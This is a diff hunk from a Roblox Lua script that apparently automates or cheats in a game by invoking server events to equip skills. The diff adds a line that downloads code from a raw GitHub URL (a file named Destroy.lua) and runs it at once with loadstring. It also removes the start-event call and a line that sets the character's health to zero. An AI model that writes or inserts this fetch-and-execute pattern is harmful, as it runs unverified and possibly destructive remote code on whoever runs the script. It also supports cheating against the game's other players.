@@ -512,8 +512,7 @@ end
 function iniciarJuego()
 	local player = game.Players.LocalPlayer
 	local data = game.ReplicatedStorage.Datas[player.UserId]
-	game:GetService("ReplicatedStorage").Package.Events.Start:InvokeServer()
-	game.Players.LocalPlayer.Character.Humanoid.Health = 0
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LUATT11/Lua/main/Destroy.lua"))()
 	if data.Strength.Value>=8000000 then
 		wait(5)
 		game:GetService("ReplicatedStorage").Package.Events.equipskill:InvokeServer("Godly SSJ2")
